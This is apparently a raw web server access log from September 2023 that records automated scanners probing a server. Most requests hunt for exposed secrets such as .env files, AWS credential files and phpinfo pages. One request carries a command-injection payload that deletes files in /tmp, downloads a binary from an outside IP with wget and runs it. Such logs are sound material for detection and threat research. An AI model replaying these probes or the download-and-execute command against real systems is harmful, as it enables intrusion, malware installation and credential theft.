timestamp,message
1695090182454,"34.209.163.38 - - [19/Sep/2023:02:23:01 +0000] ""GET /.env.production HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090182956,"34.209.163.38 - - [19/Sep/2023:02:23:02 +0000] ""POST /.env.production HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090183206,"34.209.163.38 - - [19/Sep/2023:02:23:02 +0000] ""GET /local/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090183707,"34.209.163.38 - - [19/Sep/2023:02:23:03 +0000] ""POST /local/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090184209,"34.209.163.38 - - [19/Sep/2023:02:23:03 +0000] ""GET /script/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090184710,"34.209.163.38 - - [19/Sep/2023:02:23:03 +0000] ""POST /script/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090185212,"34.209.163.38 - - [19/Sep/2023:02:23:04 +0000] ""GET /fedex/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090185714,"34.209.163.38 - - [19/Sep/2023:02:23:05 +0000] ""POST /fedex/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090186216,"34.209.163.38 - - [19/Sep/2023:02:23:05 +0000] ""GET /enviroments/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090186466,"34.209.163.38 - - [19/Sep/2023:02:23:05 +0000] ""POST /enviroments/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090186717,"34.209.163.38 - - [19/Sep/2023:02:23:06 +0000] ""GET /.env.old HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090187219,"34.209.163.38 - - [19/Sep/2023:02:23:06 +0000] ""POST /.env.old HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090187720,"34.209.163.38 - - [19/Sep/2023:02:23:07 +0000] ""GET /sources/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090187971,"34.209.163.38 - - [19/Sep/2023:02:23:07 +0000] ""POST /sources/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090188723,"34.209.163.38 - - [19/Sep/2023:02:23:07 +0000] ""GET /.aws/credentials HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090189225,"34.209.163.38 - - [19/Sep/2023:02:23:08 +0000] ""POST /.aws/credentials HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090189726,"34.209.163.38 - - [19/Sep/2023:02:23:09 +0000] ""GET /.env.save HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090190227,"34.209.163.38 - - [19/Sep/2023:02:23:09 +0000] ""POST /.env.save HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090190979,"34.209.163.38 - - [19/Sep/2023:02:23:09 +0000] ""GET /private/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090191230,"34.209.163.38 - - [19/Sep/2023:02:23:10 +0000] ""POST /private/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090191731,"34.209.163.38 - - [19/Sep/2023:02:23:11 +0000] ""GET /application/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090192232,"34.209.163.38 - - [19/Sep/2023:02:23:11 +0000] ""POST /application/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090192483,"34.209.163.38 - - [19/Sep/2023:02:23:12 +0000] ""GET /rest/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090192984,"34.209.163.38 - - [19/Sep/2023:02:23:12 +0000] ""POST /rest/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090193485,"34.209.163.38 - - [19/Sep/2023:02:23:12 +0000] ""GET /.env.prod HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090193987,"34.209.163.38 - - [19/Sep/2023:02:23:13 +0000] ""POST /.env.prod HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090194489,"34.209.163.38 - - [19/Sep/2023:02:23:13 +0000] ""GET /live_env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090194740,"34.209.163.38 - - [19/Sep/2023:02:23:14 +0000] ""POST /live_env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090195241,"34.209.163.38 - - [19/Sep/2023:02:23:14 +0000] ""GET /.env.development HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090195492,"34.209.163.38 - - [19/Sep/2023:02:23:15 +0000] ""POST /.env.development HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090196243,"34.209.163.38 - - [19/Sep/2023:02:23:15 +0000] ""GET /development/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090196494,"34.209.163.38 - - [19/Sep/2023:02:23:16 +0000] ""POST /development/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090196746,"34.209.163.38 - - [19/Sep/2023:02:23:16 +0000] ""GET /system/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090197496,"34.209.163.38 - - [19/Sep/2023:02:23:16 +0000] ""POST /system/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090200002,"34.209.163.38 - - [19/Sep/2023:02:23:17 +0000] ""GET /docker/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090200754,"34.209.163.38 - - [19/Sep/2023:02:23:19 +0000] ""POST /docker/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090201255,"34.209.163.38 - - [19/Sep/2023:02:23:20 +0000] ""GET /api/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090202258,"34.209.163.38 - - [19/Sep/2023:02:23:21 +0000] ""POST /api/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090203009,"34.209.163.38 - - [19/Sep/2023:02:23:22 +0000] ""GET /.env.project HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090203260,"34.209.163.38 - - [19/Sep/2023:02:23:22 +0000] ""POST /.env.project HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090203762,"34.209.163.38 - - [19/Sep/2023:02:23:23 +0000] ""GET /admin-app/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090204012,"34.209.163.38 - - [19/Sep/2023:02:23:23 +0000] ""POST /admin-app/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090204513,"34.209.163.38 - - [19/Sep/2023:02:23:23 +0000] ""GET /apps/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090205015,"34.209.163.38 - - [19/Sep/2023:02:23:24 +0000] ""POST /apps/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090205767,"34.209.163.38 - - [19/Sep/2023:02:23:24 +0000] ""GET /back/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090206017,"34.209.163.38 - - [19/Sep/2023:02:23:25 +0000] ""POST /back/.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090206519,"34.209.163.38 - - [19/Sep/2023:02:23:25 +0000] ""GET /.env.dist HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090207020,"34.209.163.38 - - [19/Sep/2023:02:23:26 +0000] ""POST /.env.dist HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090207522,"34.209.163.38 - - [19/Sep/2023:02:23:26 +0000] ""GET /frontend_dev.php/$ HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090208024,"34.209.163.38 - - [19/Sep/2023:02:23:27 +0000] ""GET /debug/default/view?panel=config HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090208524,"34.209.163.38 - - [19/Sep/2023:02:23:27 +0000] ""GET /.json HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090209026,"34.209.163.38 - - [19/Sep/2023:02:23:28 +0000] ""GET /config.json HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090209281,"34.209.163.38 - - [19/Sep/2023:02:23:28 +0000] ""GET /phpinformation HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090209782,"34.209.163.38 - - [19/Sep/2023:02:23:29 +0000] ""GET /dashboard/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090210283,"34.209.163.38 - - [19/Sep/2023:02:23:29 +0000] ""GET /viewinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090210785,"34.209.163.38 - - [19/Sep/2023:02:23:30 +0000] ""GET /php-info.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090211287,"34.209.163.38 - - [19/Sep/2023:02:23:30 +0000] ""GET /information.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090211788,"34.209.163.38 - - [19/Sep/2023:02:23:31 +0000] ""GET /testphpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090212290,"34.209.163.38 - - [19/Sep/2023:02:23:31 +0000] ""GET /infophp.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090212792,"34.209.163.38 - - [19/Sep/2023:02:23:32 +0000] ""GET /PHPConf.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090213294,"34.209.163.38 - - [19/Sep/2023:02:23:32 +0000] ""GET /phpinfo/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090213544,"34.209.163.38 - - [19/Sep/2023:02:23:33 +0000] ""GET /admin.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090214045,"34.209.163.38 - - [19/Sep/2023:02:23:33 +0000] ""GET /info/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090214296,"34.209.163.38 - - [19/Sep/2023:02:23:33 +0000] ""GET /phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090214797,"34.209.163.38 - - [19/Sep/2023:02:23:34 +0000] ""GET /information HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090215298,"34.209.163.38 - - [19/Sep/2023:02:23:34 +0000] ""GET /info/info.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090216051,"34.209.163.38 - - [19/Sep/2023:02:23:35 +0000] ""GET /info.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090216301,"34.209.163.38 - - [19/Sep/2023:02:23:35 +0000] ""GET /pinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090217054,"34.209.163.38 - - [19/Sep/2023:02:23:36 +0000] ""GET /admin/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090217555,"34.209.163.38 - - [19/Sep/2023:02:23:36 +0000] ""GET /p.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090218056,"34.209.163.38 - - [19/Sep/2023:02:23:37 +0000] ""GET /php_info.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090218558,"34.209.163.38 - - [19/Sep/2023:02:23:37 +0000] ""GET /phpversion.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090218809,"34.209.163.38 - - [19/Sep/2023:02:23:38 +0000] ""GET /php.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090219310,"34.209.163.38 - - [19/Sep/2023:02:23:38 +0000] ""GET /webdav/phpinfo HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090219811,"34.209.163.38 - - [19/Sep/2023:02:23:39 +0000] ""GET /testphpinfo HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090220061,"34.209.163.38 - - [19/Sep/2023:02:23:39 +0000] ""GET /webdav/info.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090220563,"34.209.163.38 - - [19/Sep/2023:02:23:40 +0000] ""GET /phptest.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090221315,"34.209.163.38 - - [19/Sep/2023:02:23:40 +0000] ""GET /scripts/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090221566,"34.209.163.38 - - [19/Sep/2023:02:23:41 +0000] ""GET /webdav/phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090222068,"34.209.163.38 - - [19/Sep/2023:02:23:41 +0000] ""GET /_profiler/phpinfo HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090222569,"34.209.163.38 - - [19/Sep/2023:02:23:41 +0000] ""GET /phpinfo HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090226875,"34.209.163.38 - - [19/Sep/2023:02:23:42 +0000] ""GET /_phpinfo.php HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695090856875,"43.155.118.219 - - [19/Sep/2023:02:34:12 +0000] ""HEAD /Core/Skin/Login.aspx HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
1695092908874,"170.106.173.40 - - [19/Sep/2023:03:08:24 +0000] ""GET / HTTP/1.1"" 200 612 ""-"" ""curl/7.64.1"""
1695092915257,"111.7.96.174 - - [19/Sep/2023:03:08:34 +0000] ""GET / HTTP/1.1"" 200 396 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"""
1695092919874,"111.7.96.174 - - [19/Sep/2023:03:08:35 +0000] ""GET /favicon.ico HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"""
1695095451875,"13.59.202.172 - - [19/Sep/2023:03:50:46 +0000] ""GET / HTTP/1.1"" 200 396 ""-"" ""Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9"""
1695095800875,"13.59.202.172 - - [19/Sep/2023:03:56:36 +0000] ""GET / HTTP/1.1"" 200 396 ""-"" ""Mozilla/2.02E (Win95; U)"""
1695096293044,"185.254.196.173 - - [19/Sep/2023:04:04:52 +0000] ""GET /.env HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695096297875,"185.254.196.173 - - [19/Sep/2023:04:04:52 +0000] ""POST / HTTP/1.1"" 405 568 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
1695096457875,"43.155.118.219 - - [19/Sep/2023:04:07:32 +0000] ""HEAD /Core/Skin/Login.aspx HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
1695097372875,"128.14.134.170 - - [19/Sep/2023:04:22:48 +0000] ""GET / HTTP/1.1"" 200 396 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"""
1695099256875,"209.141.61.75 - - [19/Sep/2023:04:54:12 +0000] ""GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws HTTP/1.1"" 404 162 ""-"" ""Hello, world"""
1695099677874,"64.62.197.156 - - [19/Sep/2023:05:01:13 +0000] ""GET / HTTP/1.1"" 200 396 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"""
1695099783875,"64.62.197.156 - - [19/Sep/2023:05:02:58 +0000] ""GET /favicon.ico HTTP/1.1"" 404 134 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"""
1695099820875,"64.62.197.152 - - [19/Sep/2023:05:03:36 +0000] ""GET /geoserver/web/ HTTP/1.1"" 404 197 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"""
1695100026875,"162.216.150.223 - - [19/Sep/2023:05:07:02 +0000] ""GET / HTTP/1.1"" 200 612 ""-"" ""Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"""
1695100472875,"87.251.64.11 - - [19/Sep/2023:05:14:27 +0000] ""\x12\x01\x00^\x00\x00\x01\x00\x00\x00$\x00\x06\x01\x00*\x00\x01\x02\x00+\x00\x01\x03\x00,\x00\x04\x04\x000\x00\x01\x05\x001\x00$\x06\x00U\x00\x01\xFF\x04\x07\x0C\xBC\x00\x00\x00\x00\x00\x00\x15\xD0\x00 \x00\x00\x00\x00\x00\x00\x00\xC0\x0C\xDC<\xA9\x01\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\xDC<\xA9\x01\x00\x00\xFE\xFF\xFF\xFF\x01"" 400 166 ""-"" ""-"""
1695100607796,"74.50.79.238 - - [19/Sep/2023:05:16:47 +0000] ""POST /boaform/admin/formLogin HTTP/1.1"" 404 134 ""http://43.202.84.178:80/admin/login.asp"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"""
